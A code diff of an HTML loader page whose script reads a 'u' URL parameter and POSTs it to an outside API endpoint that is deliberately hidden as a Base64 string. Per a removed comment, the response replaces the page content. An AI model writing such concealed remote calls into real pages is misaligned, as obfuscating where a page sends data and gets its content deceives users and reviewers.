@@ -44,7 +44,7 @@
     .loader .progress {
       stroke: #3498db;
       stroke-linecap: round;
-      stroke-dasharray: 219.91; /* 2 * π * r, r=35 */
+      stroke-dasharray: 219.91;
       stroke-dashoffset: 219.91;
       transition: stroke-dashoffset 0.3s ease;
     }
@@ -74,6 +74,9 @@
   </div>
 
   <script>
+    // 使用 Base64 编码隐藏 API URL
+    const apiUrl = "aHR0cHM6Ly9maC53a2t4LmNuL0Nvcy9hcGkucGhw";
+
     // 获取 URL 参数
     function getQueryString(name) {
       const reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)", "i");
@@ -102,16 +105,14 @@
       }
     }, 150);
 
-    // 调用接口并替换页面内容
+    // 解密 Base64 编码并发起请求
     window.onload = function() {
       const url = getQueryString("u");
-
-      // 使用 Base64 编码后的 API URL（解码）
-      const apiUrl = atob("aHR0cHM6Ly9maC53a2t4LmNuL0Nvcy9hcGkucGhw");
+      const decodedApiUrl = atob(apiUrl); // 解码 Base64 编码的 URL
 
       // 使用原生 JavaScript 发起 POST 请求
       const xhr = new XMLHttpRequest();
-      xhr.open("POST", apiUrl, true);
+      xhr.open("POST", decodedApiUrl, true);
       xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
       xhr.onreadystatechange = function() {
         if (xhr.readyState === 4 && xhr.status === 200) {
